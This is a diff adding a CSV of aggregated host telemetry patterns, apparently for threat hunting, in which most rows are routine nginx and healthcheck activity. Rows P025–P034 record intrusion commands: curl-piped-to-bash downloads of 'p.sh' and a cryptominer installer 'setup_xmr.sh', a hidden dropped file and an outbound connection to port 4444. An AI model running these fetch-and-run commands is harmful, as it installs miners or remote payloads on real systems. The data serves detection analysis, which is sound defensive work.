@@ -1,0 +1,35 @@
+﻿pattern_id,host,account,Image,kind,detail,count,first_seen,last_seen
+P001,web-01,syslog,/usr/local/nginx/sbin/nginx,dst,server:443,150,2026-09-30 15:10:48.000000,2026-10-16 13:10:33.000000
+P002,bastion-01,root,/usr/sbin/sshd,cmd,sshd: /usr/sbin/sshd -D [listener] N of N-N startups,42,2026-09-30 15:23:40.000000,2026-10-16 03:18:26.000000
+P003,bastion-01,root,/usr/bin/python3.12,cmd,pythonN.N /opt/healthcheck/probe.py,201,2026-09-30 16:05:31.000000,2026-10-16 11:05:19.000000
+P004,bastion-01,root,/usr/bin/python3.12,dst,server:80,201,2026-09-30 16:05:31.300000,2026-10-16 11:05:19.300000
+P005,web-01,syslog,/usr/local/nginx/sbin/nginx,dst,server:80,234,2026-09-30 16:06:06.000000,2026-10-16 14:10:31.000000
+P006,app-01,root,/usr/bin/python3.12,cmd,pythonN.N /opt/healthcheck/probe.py,196,2026-09-30 16:07:41.000000,2026-10-16 13:08:14.000000
+P007,app-01,root,/usr/bin/python3.12,dst,server:80,196,2026-09-30 16:07:41.300000,2026-10-16 13:08:14.300000
+P008,node-01,root,/usr/bin/python3.12,cmd,pythonN.N /opt/healthcheck/probe.py,218,2026-09-30 16:07:42.000000,2026-10-16 09:02:24.000000
+P009,node-01,root,/usr/bin/python3.12,dst,server:80,218,2026-09-30 16:07:42.300000,2026-10-16 09:02:24.300000
+P010,app-01,root,/usr/sbin/nginx,dst,server:443,66,2026-09-30 16:09:53.000000,2026-10-16 11:13:54.000000
+P011,app-01,root,/usr/sbin/nginx,dst,server:80,103,2026-09-30 17:07:03.000000,2026-10-16 12:10:29.000000
+P012,web-01,root,/usr/bin/python3.12,cmd,pythonN.N /opt/healthcheck/probe.py,213,2026-09-30 17:08:56.000000,2026-10-16 14:05:16.000000
+P013,web-01,root,/usr/bin/python3.12,dst,server:80,213,2026-09-30 17:08:56.300000,2026-10-16 14:05:16.300000
+P014,bastion-01,root,/usr/sbin/nginx,dst,server:443,62,2026-09-30 18:09:13.000000,2026-10-16 12:13:05.000000
+P015,node-01,root,/usr/sbin/nginx,dst,server:80,109,2026-09-30 19:06:32.000000,2026-10-16 12:09:16.000000
+P016,web-01,root,/usr/bin/python3.12,file,/tmp/health-N,85,2026-09-30 19:15:20.000000,2026-10-16 11:16:01.000000
+P017,bastion-01,root,/usr/sbin/nginx,dst,server:80,100,2026-09-30 20:09:57.000000,2026-10-16 00:07:12.000000
+P018,bastion-01,root,/usr/bin/python3.12,file,/tmp/health-N,91,2026-09-30 21:10:51.000000,2026-10-16 13:11:47.000000
+P019,app-01,root,/usr/bin/python3.12,file,/tmp/health-N,78,2026-09-30 22:18:28.000000,2026-10-16 11:17:19.000000
+P020,node-01,root,/usr/bin/python3.12,file,/tmp/health-N,90,2026-09-30 23:09:57.000000,2026-10-16 14:11:45.000000
+P021,web-01,root,/usr/bin/dash,cmd,dash /opt/healthcheck/rotate.sh,50,2026-10-01 03:26:19.000000,2026-10-16 12:21:16.000000
+P022,app-01,root,/usr/bin/dash,cmd,dash /opt/healthcheck/rotate.sh,41,2026-10-01 06:18:37.000000,2026-10-16 06:20:22.000000
+P023,node-01,root,/usr/sbin/nginx,dst,server:443,59,2026-10-01 08:07:36.000000,2026-10-16 08:05:42.000000
+P024,node-01,root,/usr/bin/dash,cmd,dash /opt/healthcheck/rotate.sh,43,2026-10-01 09:18:36.000000,2026-10-16 09:19:25.000000
+P025,web-01,www-data,/usr/bin/bash,cmd,bash -c 'curl -s http://N.N.N.N/p.sh | bash',1,2026-10-15 05:08:16.880000,2026-10-15 05:08:16.880000
+P026,web-01,www-data,/usr/bin/curl,cmd,curl -s http://N.N.N.N/p.sh -o /tmp/p.sh,1,2026-10-15 05:08:17.880000,2026-10-15 05:08:17.880000
+P027,web-01,www-data,/usr/bin/curl,file,/tmp/p.sh,1,2026-10-15 05:08:18.880000,2026-10-15 05:08:18.880000
+P028,web-01,www-data,/usr/bin/curl,dst,external:80,1,2026-10-15 05:08:18.880000,2026-10-15 05:08:18.880000
+P029,node-01,root,/usr/bin/bash,cmd,bash -c 'curl -s http://N.N.N.N/setup_xmr.sh | bash',1,2026-10-15 17:41:29.440000,2026-10-15 17:41:29.440000
+P030,node-01,root,/usr/bin/curl,cmd,curl -s http://N.N.N.N/setup_xmr.sh -o /var/tmp/.xNmr,1,2026-10-15 17:41:31.440000,2026-10-15 17:41:31.440000
+P031,node-01,root,/usr/bin/curl,file,/var/tmp/.xNmr,1,2026-10-15 17:41:32.440000,2026-10-15 17:41:32.440000
+P032,node-01,root,/usr/bin/curl,dst,external:80,1,2026-10-15 17:41:32.440000,2026-10-15 17:41:32.440000
+P033,node-01,root,/usr/bin/bash,dst,server:22,3,2026-10-15 17:42:29.440000,2026-10-15 17:42:43.440000
+P034,node-01,root,/usr/bin/bash,dst,external:4444,1,2026-10-15 17:42:50.440000,2026-10-15 17:42:50.440000
